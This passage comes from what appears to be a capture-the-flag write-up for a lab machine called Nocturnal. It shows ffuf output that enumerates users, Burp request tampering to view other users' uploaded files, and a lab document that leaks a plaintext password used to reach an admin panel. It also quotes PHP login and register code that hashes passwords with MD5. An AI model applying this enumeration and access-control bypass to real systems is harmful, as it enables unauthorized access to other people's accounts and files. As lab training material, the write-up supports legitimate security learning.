</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="w"> </span>::<span class="w"> </span>Filter<span class="w">           </span>:<span class="w"> </span>Response<span class="w"> </span>size:<span class="w"> </span><span class="m">2985</span>
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>________________________________________________
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>admin<span class="w">                </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">3037</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">1174</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">129</span>,<span class="w"> </span>Duration:<span class="w"> </span>47ms<span class="o">]</span>
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>amanda<span class="w">               </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">3113</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">1175</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">129</span>,<span class="w"> </span>Duration:<span class="w"> </span>51ms<span class="o">]</span>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>tobias<span class="w">               </span><span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">3037</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">1174</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">129</span>,<span class="w"> </span>Duration:<span class="w"> </span>50ms<span class="o">]</span>
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">10177</span>/10177<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">1</span>/1<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">851</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:00:12<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">0</span><span class="w"> </span>::
</span></code></pre></div>
<p>great! it found 3 users!:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>admin
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>amanda
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>tobias
</span></code></pre></div></p>
<p>Perfect! since we know have all the available users.</p>
<p>Since the dashboard.php's request does not require the pass of the user, we can just use burp for every user to reach their dashboard page, and view their uploaded files.</p>
<p>So, try to click your uploaded file as the user you created (ch3ckm8), and interecept the request with burp, in order to modify it and then forwarding the request.</p>
<p>Disclaimer: the file in the request can be anything, even a non existing filename in the request wont stop the page from showing all the uploaded files of a user.<br />
<img alt="Pasted image 20250529010842" src="../MediaFiles/Pasted%20image%2020250529010842.png" /><br />
to each of the users we have, lets start with tobias:<br />
<img alt="Pasted image 20250529010942" src="../MediaFiles/Pasted%20image%2020250529010942.png" /><br />
Hm, no luck with tobias, i tried admin too and no files uploaded for this user.....</p>
<p>now lets try user amanda similarly, <br />
<img alt="Pasted image 20250529011708" src="../MediaFiles/Pasted%20image%2020250529011708.png" /></p>
<p>it appears there she has a file uploaded!<br />
<img alt="Pasted image 20250529011205" src="../MediaFiles/Pasted%20image%2020250529011205.png" /></p>
<p>Lets first download the <code>.odt</code> file and view its contents:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Dear Amanda,
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>The file has been created and provided by Nocturnal&#39;s IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>Yours sincerely,
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>Nocturnal&#39;s IT team
</span></code></pre></div></p>
<p>inside this text, we found plaintext pass for user amanda, the updated creds now are:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>amanda
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>arHkG7HAI68X8s1J
</span></code></pre></div></p>
<p>We can now proceed on logging in as amanda, then we see sth interesting here:<br />
<img alt="Pasted image 20250527174944" src="../MediaFiles/Pasted%20image%2020250527174944.png" /></p>
<p>it seems that amanda has access to the admin panel, and thats convenient, since we cant access the admin panel as admin.</p>
<p>We can go to the admin panel by clicking on the admin panel button on the same page, we come accross this page :</p>
<p><code>admin.php</code><br />
<img alt="Pasted image 20250527175300" src="../MediaFiles/Pasted%20image%2020250527175300.png" /><br />
i had some interesting observations here, first there are both php files, and folders (backups, uploads), and secondly we can enter input via text (backup password) to create a backup.</p>
<p>Then lets enter a password of our preference, create a backup, download it, to view some of the files:<br />
<img alt="Pasted image 20250529013824" src="../MediaFiles/Pasted%20image%2020250529013824.png" /><br />
so, upon reading the files above, i noticed the following about the files and folders:<br />
- uploads -&gt; contains the uploaded files <br />
- logout.php -&gt; just logs out the user, nothing further valuable<br />
- style.css -&gt; the style of the page, no comments or anything else observed<br />
- index.php -&gt; the homepage, nothing further interesting<br />
- register.php</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>&lt;?php
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>session_start<span class="o">()</span><span class="p">;</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>SQLite3<span class="o">(</span><span class="s1">&#39;../nocturnal_database/nocturnal_database.db&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>md5<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s2">&quot;INSERT INTO users (username, password) VALUES (:username, :password)&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="w">    </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:username&#39;</span>,<span class="w"> </span><span class="nv">$username</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="w">    </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:password&#39;</span>,<span class="w"> </span><span class="nv">$password</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$stmt</span>-&gt;execute<span class="o">())</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="w">        </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;success&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;User registered successfully!&#39;</span><span class="p">;</span>
</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="w">        </span>header<span class="o">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="w">        </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="w">        </span><span class="nv">$error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Failed to register user.&#39;</span><span class="p">;</span>
</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="o">}</span>
</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>?&gt;
</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>&lt;!DOCTYPE<span class="w"> </span>html&gt;
</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>&lt;head&gt;
</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="w">    </span>&lt;title&gt;Register&lt;/title&gt;
</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="w">    </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;style.css&quot;</span>&gt;
</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>&lt;/head&gt;
</span><span id="__span-13-31"><a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>&lt;body&gt;
</span><span id="__span-13-32"><a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a><span class="w">    </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span id="__span-13-33"><a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a><span class="w">        </span>&lt;h1&gt;Register&lt;/h1&gt;
</span><span id="__span-13-34"><a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$error</span><span class="o">))</span>:<span class="w"> </span>?&gt;
</span><span id="__span-13-35"><a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a><span class="w">            </span>&lt;p<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;error&quot;</span>&gt;&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$error</span><span class="p">;</span><span class="w"> </span>?&gt;&lt;/p&gt;
</span><span id="__span-13-36"><a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="w">        </span>&lt;?php<span class="w"> </span>endif<span class="p">;</span><span class="w"> </span>?&gt;
</span><span id="__span-13-37"><a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a><span class="w">        </span>&lt;form<span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span>&gt;
</span><span id="__span-13-38"><a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a><span class="w">            </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;Username&quot;</span><span class="w"> </span>required&gt;
</span><span id="__span-13-39"><a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a><span class="w">            </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;Password&quot;</span><span class="w"> </span>required&gt;
</span><span id="__span-13-40"><a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a><span class="w">            </span>&lt;button<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span>&gt;Register&lt;/button&gt;
</span><span id="__span-13-41"><a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a><span class="w">        </span>&lt;/form&gt;
</span><span id="__span-13-42"><a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a><span class="w">        </span>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;login.php&quot;</span>&gt;Already<span class="w"> </span>have<span class="w"> </span>an<span class="w"> </span>account?<span class="w"> </span>Login<span class="w"> </span>here&lt;/a&gt;
</span><span id="__span-13-43"><a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a><span class="w">    </span>&lt;/div&gt;
</span><span id="__span-13-44"><a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>&lt;/body&gt;
</span><span id="__span-13-45"><a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a>&lt;/html&gt;
</span></code></pre></div>
<ul>
<li>login.php</li>
</ul>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>&lt;?php
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>session_start<span class="o">()</span><span class="p">;</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>SQLite3<span class="o">(</span><span class="s1">&#39;../nocturnal_database/nocturnal_database.db&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">    </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>
</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">    </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = :username&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">    </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:username&#39;</span>,<span class="w"> </span><span class="nv">$username</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stmt</span>-&gt;execute<span class="o">()</span>-&gt;fetchArray<span class="o">()</span><span class="p">;</span>
</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$result</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>md5<span class="o">(</span><span class="nv">$password</span><span class="o">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nv">$result</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">        </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="w">        </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$username</span><span class="p">;</span>
</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">        </span>header<span class="o">(</span><span class="s1">&#39;Location: dashboard.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">        </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="w">        </span><span class="nv">$error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Invalid username or password.&#39;</span><span class="p">;</span>
</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="o">}</span>
</span><span id="__span-14-22"><a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>?&gt;
</span><span id="__span-14-23"><a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>
</span><span id="__span-14-24"><a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>&lt;!DOCTYPE<span class="w"> </span>html&gt;
</span><span id="__span-14-25"><a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
</span><span id="__span-14-26"><a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>&lt;head&gt;
</span><span id="__span-14-27"><a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span id="__span-14-28"><a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
</span><span id="__span-14-29"><a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="w">    </span>&lt;title&gt;Login&lt;/title&gt;
</span><span id="__span-14-30"><a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="w">    </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;style.css&quot;</span>&gt;
</span><span id="__span-14-31"><a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>&lt;/head&gt;
</span><span id="__span-14-32"><a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>&lt;body&gt;
</span><span id="__span-14-33"><a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="w">    </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span id="__span-14-34"><a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="w">        </span>&lt;h1&gt;Login&lt;/h1&gt;
</span><span id="__span-14-35"><a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="w">        </span>&lt;?php<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$error</span><span class="o">))</span>:<span class="w"> </span>?&gt;
</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="w">            </span>&lt;p<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;error&quot;</span>&gt;&lt;?php<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$error</span><span class="p">;</span><span class="w"> </span>?&gt;&lt;/p&gt;
</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="w">        </span>&lt;?php<span class="w"> </span>endif<span class="p">;</span><span class="w"> </span>?&gt;
</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="w">        </span>&lt;form<span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span>&gt;
</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="w">            </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="w"> </span><span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;Username&quot;</span><span class="w"> </span>required&gt;
</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a><span class="w">            </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="w"> </span><span class="nv">placeholder</span><span class="o">=</span><span class="s2">&quot;Password&quot;</span><span class="w"> </span>required&gt;
</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a><span class="w">            </span>&lt;button<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span>&gt;Login&lt;/button&gt;
</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="w">        </span>&lt;/form&gt;
</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a><span class="w">        </span>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;register.php&quot;</span>&gt;Don<span class="err">&#39;</span>t<span class="w"> </span>have<span class="w"> </span>an<span class="w"> </span>account?<span class="w"> </span>Register<span class="w"> </span>here&lt;/a&gt;
</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a><span class="w">    </span>&lt;/div&gt;
</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>&lt;/body&gt;
</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>&lt;/html&gt;
</span></code></pre></div>
<ul>
<li>dashboard.php <br />
<img alt="Pasted image 20250529004248" src="../MediaFiles/Pasted%20image%2020250529004248.png" /></li>
</ul>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>&lt;?php
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>session_start<span class="o">()</span><span class="p">;</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">]))</span><span class="w"> </span><span class="o">{</span>
